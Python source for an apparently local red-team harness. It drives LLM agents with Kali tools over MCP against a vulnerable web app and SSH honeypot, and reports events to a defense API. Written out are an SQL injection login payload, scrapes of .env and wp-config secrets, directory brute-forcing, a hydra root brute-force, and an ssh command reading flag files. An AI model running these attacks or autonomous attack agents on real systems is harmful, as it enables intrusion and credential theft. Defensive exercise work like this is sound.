from __future__ import annotations

import asyncio
import json
import os
import urllib.error
import urllib.request
import socket
import time
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path
from typing import Dict
from urllib.parse import parse_qsl, urljoin, urlparse

import requests
from agents import Agent, Runner, set_default_openai_api, set_tracing_disabled

from kali_mcp import KaliMCPConfig, KaliMCPSession
from memory import AttackMemory

PROMPT_DIR = Path(__file__).resolve().parent / "prompts"
MEMORY_PATH = Path(__file__).resolve().parent / "state" / "memory.json"
OPERATIONS_LOG = Path(__file__).resolve().parent / "state" / "operations.jsonl"

GREEN = "\033[92m"
DIM = "\033[2m"
BOLD = "\033[1m"
RESET = "\033[0m"


@dataclass
class AttackConfig:
    target_base: str = os.getenv("ATTACKER2_TARGET_BASE", "http://localhost:3000")
    system_host: str = os.getenv("ATTACKER2_SYSTEM_HOST", "localhost")
    system_port: int = int(os.getenv("ATTACKER2_SYSTEM_PORT", "2222"))
    defense_api: str = os.getenv("ATTACKER2_DEFENSE_API", "http://localhost:7700")
    defense_timeout: float = float(os.getenv("ATTACKER2_DEFENSE_TIMEOUT", "10"))
    max_steps: int = int(os.getenv("ATTACKER2_MAX_STEPS", "5"))
    model: str = os.getenv("ATTACKER2_MODEL", os.getenv("OPENAI_ATTACK_MODEL", "gpt-4o-mini"))
    mirror_attack_log: bool = os.getenv("ATTACKER2_MIRROR_ATTACK_LOG", "1").lower() in {"1", "true", "yes", "on"}
    attack_log_path: Path = field(
        default_factory=lambda: Path(
            os.getenv(
                "ATTACKER2_ATTACK_LOG_PATH",
                str(Path(__file__).resolve().parents[1] / "vulnerable-app" / "attack_log.json"),
            )
        )
    )
    attack_log_ip: str = os.getenv("ATTACKER2_ATTACK_LOG_IP", "::ffff:127.0.0.1")
    mirror_honeypot_log: bool = os.getenv("ATTACKER2_MIRROR_HONEYPOT_LOG", "1").lower() in {"1", "true", "yes", "on"}
    honeypot_log_path: Path = field(
        default_factory=lambda: Path(
            os.getenv(
                "ATTACKER2_HONEYPOT_LOG_PATH",
                str(Path(__file__).resolve().parents[2] / "defense" / "tarpit_boxes" / "ssh_commands.log"),
            )
        )
    )
    preflight_http_events: int = int(os.getenv("ATTACKER2_PREFLIGHT_HTTP_EVENTS", "2"))
    preflight_ssh_events: int = int(os.getenv("ATTACKER2_PREFLIGHT_SSH_EVENTS", "1"))
    preflight_ssh_handshakes: int = int(os.getenv("ATTACKER2_PREFLIGHT_SSH_HANDSHAKES", "4"))


@dataclass
class Specialist:
    name: str
    prompt_file: Path
    channel: str
    focus: str


SPECIALISTS = [
    Specialist(
        name="WebProbe",
        prompt_file=PROMPT_DIR / "kali_mcp_web.md",
        channel="WEB",
        focus="HTTP probes, auth bypass, file download traps",
    ),
    Specialist(
        name="SystemSweep",
        prompt_file=PROMPT_DIR / "kali_mcp_system.md",
        channel="SYSTEM",
        focus="port sweeps, SSH banner grabs, quick filesystem pokes",
    ),
]

SPECIALIST_BY_CHANNEL = {spec.channel: spec for spec in SPECIALISTS}


def _target_for_channel(cfg: AttackConfig, channel: str) -> str:
    if channel == "SYSTEM":
        return f"ssh://{cfg.system_host}:{cfg.system_port}"
    return cfg.target_base


def _build_task(
    step: int,
    cfg: AttackConfig,
    memory: AttackMemory,
    specialist: Specialist,
) -> str:
    context = memory.render_context(limit=3)
    target_hint = _target_for_channel(cfg, specialist.channel)
    return (
        f"{specialist.channel} step {step}/{cfg.max_steps}\n"
        f"Target: {target_hint}\n"
        f"Focus: {specialist.focus}\n"
        "Recent context:\n"
        f"{context}\n\n"
        "Reply only with your JSON contract. Keep every field under ~60 words."
    )


def _log_operation(entry: Dict[str, object]) -> None:
    OPERATIONS_LOG.parent.mkdir(parents=True, exist_ok=True)
    with OPERATIONS_LOG.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps({**entry, "timestamp": datetime.now(UTC).isoformat()}) + "\n")


def _print_step(entry: Dict[str, object]) -> None:
    channel = entry.get("channel", "WEB")
    divider = GREEN + "=" * 70 + RESET
    print("\n" + divider)
    print(
        f"{BOLD}{GREEN}[{channel}] STEP {entry.get('step')}:{RESET} "
        f"{entry.get('action_summary', 'No summary provided')}"
    )
    commands = entry.get("commands_executed") or []
    if commands:
        print(f"{GREEN}CMD:{RESET}")
        for cmd in commands[:3]:
            print(f"  • {cmd}")
    findings = entry.get("findings") or []
    if findings:
        print(f"{GREEN}FINDINGS:{RESET}")
        for finding in findings[:3]:
            print(f"  • {finding}")
    warnings = entry.get("warnings") or []
    if warnings:
        print(f"{GREEN}WARNINGS:{RESET}")
        for warn in warnings[:3]:
            print(f"  • {warn}")
    snippet = entry.get("raw_output_snippet") or entry.get("raw_output", "")[:140]
    if snippet:
        print(f"{DIM}SNIPPET:{RESET} {snippet}")
    next_targets = entry.get("next_targets") or []
    if next_targets:
        print(f"{GREEN}NEXT:{RESET} " + ", ".join(next_targets[:4]))
    print(divider)


def _post_attack_event(
    cfg: AttackConfig,
    entry: Dict[str, object],
    specialist: Specialist,
    target_url: str,
) -> None:
    url = cfg.defense_api.rstrip("/") + "/attack-event"
    payload = {
        "step": entry.get("step"),
        "action": {
            "action_type": f"{specialist.channel}_MCP",
            "target_url": target_url,
            "payload": {
                "commands": entry.get("commands_executed", []),
                "findings": entry.get("findings", []),
                "warnings": entry.get("warnings", []),
                "summary": entry.get("action_summary") or "",
                "raw_output": (
                    entry.get("raw_output_snippet")
                    or (
                        entry.get("raw_output", "")[:280]
                        if isinstance(entry.get("raw_output"), str)
                        else ""
                    )
                ),
            },
        },
        "status": entry.get("status") or 0,
        "response_summary": entry.get("action_summary") or "",
        "timestamp": datetime.now(UTC).isoformat(),
    }
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=cfg.defense_timeout)  # nosec B310
    except Exception as exc:  # broad except keeps attack loop alive if defense API is down
        print(f"{DIM}Warning: failed to post attack event ({exc}).{RESET}")


def _infer_http_method(entry: Dict[str, object]) -> str:
    commands = entry.get("commands_executed") or []
    if isinstance(commands, list):
        for cmd in commands:
            if not isinstance(cmd, str):
                continue
            lowered = cmd.lower()
            if any(flag in lowered for flag in (" -x post", " --data", " --data-raw", " -d ", " --request post")):
                return "POST"
    return "GET"


def _mirror_attack_log(cfg: AttackConfig, entry: Dict[str, object], target_url: str) -> None:
    if not cfg.mirror_attack_log:
        return
    parsed = urlparse(target_url)
    if parsed.scheme not in {"http", "https"}:
        return
    record = {
        "timestamp": datetime.now(UTC).isoformat(),
        "ip": cfg.attack_log_ip,
        "method": _infer_http_method(entry),
        "endpoint": parsed.path or "/",
        "query": dict(parse_qsl(parsed.query)),
        "body": {
            "summary": entry.get("action_summary", ""),
            "commands": entry.get("commands_executed", []),
        },
    }
    cfg.attack_log_path.parent.mkdir(parents=True, exist_ok=True)
    with cfg.attack_log_path.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps(record) + "\n")


def _mirror_honeypot_log(cfg: AttackConfig, entry: Dict[str, object]) -> None:
    if not cfg.mirror_honeypot_log:
        return
    commands = entry.get("commands_executed") or []
    snippet = entry.get("raw_output_snippet") or entry.get("raw_output")
    if not commands and not snippet:
        return
    cfg.honeypot_log_path.parent.mkdir(parents=True, exist_ok=True)
    timestamp = datetime.now(UTC).isoformat()
    header = f"[{timestamp}] {entry.get('channel', 'WEB')} step {entry.get('step')} – {entry.get('action_summary', '').strip()}"
    lines = [header]
    for cmd in commands:
        if isinstance(cmd, str):
            lines.append(f"CMD: {cmd}")
    if isinstance(snippet, str) and snippet:
        lines.append(f"OUT: {snippet.strip()}")
    with cfg.honeypot_log_path.open("a", encoding="utf-8") as fh:
        fh.write("\n".join(lines) + "\n")


def _run_manual_preflight(cfg: AttackConfig, memory: AttackMemory, next_step: int) -> int:
    next_step = _run_http_preflight(cfg, memory, next_step)
    next_step = _run_system_preflight(cfg, memory, next_step)
    return next_step


def _run_http_preflight(cfg: AttackConfig, memory: AttackMemory, next_step: int) -> int:
    scenarios = _http_preflight_scenarios(cfg)
    count = max(0, cfg.preflight_http_events)
    if not scenarios or count == 0:
        return next_step
    for idx in range(count):
        scenario = scenarios[idx % len(scenarios)]
        findings, warnings, snippet = _execute_http_requests(cfg, scenario["requests"])
        _record_manual_entry(
            cfg,
            memory,
            next_step,
            channel="WEB",
            summary=scenario["summary"],
            commands=scenario["commands"],
            findings=findings,
            warnings=warnings,
            next_targets=scenario.get("next", []),
            snippet=snippet,
            target_url=cfg.target_base,
        )
        next_step += 1
    return next_step


def _run_system_preflight(cfg: AttackConfig, memory: AttackMemory, next_step: int) -> int:
    scenarios = _system_preflight_scenarios(cfg)
    count = max(0, cfg.preflight_ssh_events)
    if not scenarios or count == 0:
        return next_step
    for idx in range(count):
        scenario = scenarios[idx % len(scenarios)]
        findings, warnings, snippet = _execute_ssh_noise(cfg)
        _record_manual_entry(
            cfg,
            memory,
            next_step,
            channel="SYSTEM",
            summary=scenario["summary"],
            commands=scenario["commands"],
            findings=findings,
            warnings=warnings,
            next_targets=scenario.get("next", []),
            snippet=snippet,
            target_url=f"ssh://{cfg.system_host}:{cfg.system_port}",
        )
        next_step += 1
    return next_step


def _record_manual_entry(
    cfg: AttackConfig,
    memory: AttackMemory,
    step: int,
    *,
    channel: str,
    summary: str,
    commands: list[str],
    findings: list[str],
    warnings: list[str],
    next_targets: list[str],
    snippet: str,
    target_url: str,
) -> None:
    payload = {
        "action_summary": summary,
        "commands_executed": commands,
        "findings": findings,
        "warnings": warnings,
        "next_targets": next_targets,
        "raw_output_snippet": snippet,
    }
    serialized = json.dumps(payload)
    entry = memory.record_step(step, f"{channel} preflight step {step}", serialized, channel=channel)
    entry.update(payload)
    _log_operation(entry)
    _print_step(entry)
    specialist = SPECIALIST_BY_CHANNEL.get(channel)
    if specialist:
        _post_attack_event(cfg, entry, specialist, target_url)
    if channel == "WEB":
        _mirror_attack_log(cfg, entry, target_url)
    _mirror_honeypot_log(cfg, entry)


def _http_preflight_scenarios(cfg: AttackConfig) -> list[Dict[str, object]]:
    base = cfg.target_base.rstrip("/")
    return [
        {
            "summary": "Preflight SQLi and env scrape",
            "commands": [
                f"sqlmap -u {base}/login --batch",
                f"curl -O {base}/.env",
            ],
            "requests": [
                {"method": "POST", "path": "/login", "data": {"email": "admin@example.com", "password": "admin' OR 1=1 --"}},
                {"method": "GET", "path": "/.env"},
                {"method": "GET", "path": "/admin/users"},
            ],
            "next": [f"{base}/admin", f"{base}/env/wp-config.php"],
        },
        {
            "summary": "Directory brute-force on admin/debug surfaces",
            "commands": [
                f"gobuster dir -u {base} -w /usr/share/dirb/wordlists/common.txt",
                f"curl -I {base}/admin",
                f"curl -I {base}/env/wp-config.php",
            ],
            "requests": [
                {"method": "GET", "path": "/admin"},
                {"method": "GET", "path": "/admin/login"},
                {"method": "GET", "path": "/env/wp-config.php"},
                {"method": "GET", "path": "/debug"},
                {"method": "GET", "path": "/config-prod"},
            ],
            "next": [f"{base}/debug", f"{base}/config-prod"],
        },
    ]


def _system_preflight_scenarios(cfg: AttackConfig) -> list[Dict[str, object]]:
    base = f"ssh://{cfg.system_host}:{cfg.system_port}"
    return [
        {
            "summary": "Preflight SSH banner + hydra noise",
            "commands": [
                f"nmap -sV -p {cfg.system_port} {cfg.system_host}",
                f"ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p {cfg.system_port} {cfg.system_host} 'whoami; ls /tmp; cat flag*'",
                f"hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{cfg.system_host}:{cfg.system_port}",
            ],
            "next": [base],
        }
    ]


def _execute_http_requests(cfg: AttackConfig, requests_to_run: list[Dict[str, object]]) -> tuple[list[str], list[str], str]:
    findings: list[str] = []
    warnings: list[str] = []
    for req in requests_to_run:
        method = req.get("method", "GET").upper()
        path = req.get("path", "/")
        data = req.get("data")
        url = req.get("url") or urljoin(cfg.target_base.rstrip("/") + "/", path.lstrip("/"))
        try:
            resp = requests.request(method, url, data=data, timeout=5)
            findings.append(f"{method} {url} -> {resp.status_code}")
        except requests.RequestException as exc:
            warning = f"{method} {url} failed: {exc}"
            warnings.append(warning)
    snippet_source = findings or warnings or ["No HTTP activity recorded."]
    snippet = "; ".join(snippet_source)[:240]
    return findings, warnings, snippet


def _execute_ssh_noise(cfg: AttackConfig) -> tuple[list[str], list[str], str]:
    findings: list[str] = []
    warnings: list[str] = []
    statuses: list[str] = []
    attempts = max(1, cfg.preflight_ssh_handshakes)
    for idx in range(attempts):
        try:
            with socket.create_connection((cfg.system_host, cfg.system_port), timeout=3) as sock:
                sock.sendall(b"SSH-2.0-Cerberus\r\n")
                statuses.append(f"handshake {idx + 1}: ok")
                time.sleep(0.2)
        except OSError as exc:
            message = f"handshake {idx + 1}: {exc}"
            statuses.append(message)
            warnings.append(message)
    if not warnings:
        findings.extend(statuses)
    snippet_source = statuses or ["Unable to reach SSH service."]
    snippet = "; ".join(snippet_source)[:240]
    return findings or statuses, warnings, snippet


async def run_attack_loop() -> None:
    if "OPENAI_API_KEY" not in os.environ:
        raise RuntimeError("OPENAI_API_KEY must be set to run attacker2.")
    set_default_openai_api(os.environ["OPENAI_API_KEY"])
    set_tracing_disabled(True)

    cfg = AttackConfig()
    memory = AttackMemory.load(MEMORY_PATH)
    mcp_config = KaliMCPConfig()

    print("Launching attacker2 with Kali MCP configuration:", mcp_config.summary())

    next_step = 1
    next_step = _run_manual_preflight(cfg, memory, next_step)

    async with KaliMCPSession(mcp_config) as kali_server:
        agents = {
            spec.channel: Agent(
                name=spec.name,
                model=cfg.model,
                instructions=spec.prompt_file.read_text(encoding="utf-8").strip(),
                mcp_servers=[kali_server],
            )
            for spec in SPECIALISTS
        }

        for step in range(next_step, next_step + cfg.max_steps):
            print(f"\n{GREEN}{BOLD}>>> DEPLOYING STEP {step}/{cfg.max_steps}{RESET}")
            for specialist in SPECIALISTS:
                task = _build_task(step, cfg, memory, specialist)
                target_url = _target_for_channel(cfg, specialist.channel)
                result = await Runner.run(agents[specialist.channel], task)
                entry = memory.record_step(step, task, result.final_output, channel=specialist.channel)
                _log_operation(entry)
                _print_step(entry)
                await asyncio.to_thread(_post_attack_event, cfg, entry, specialist, target_url)
                if specialist.channel == "WEB":
                    _mirror_attack_log(cfg, entry, target_url)
                _mirror_honeypot_log(cfg, entry)

    print(f"\n{GREEN}{BOLD}Attack loop complete.{RESET} State saved to {MEMORY_PATH}")


def main() -> None:
    asyncio.run(run_attack_loop())


if __name__ == "__main__":
    main()

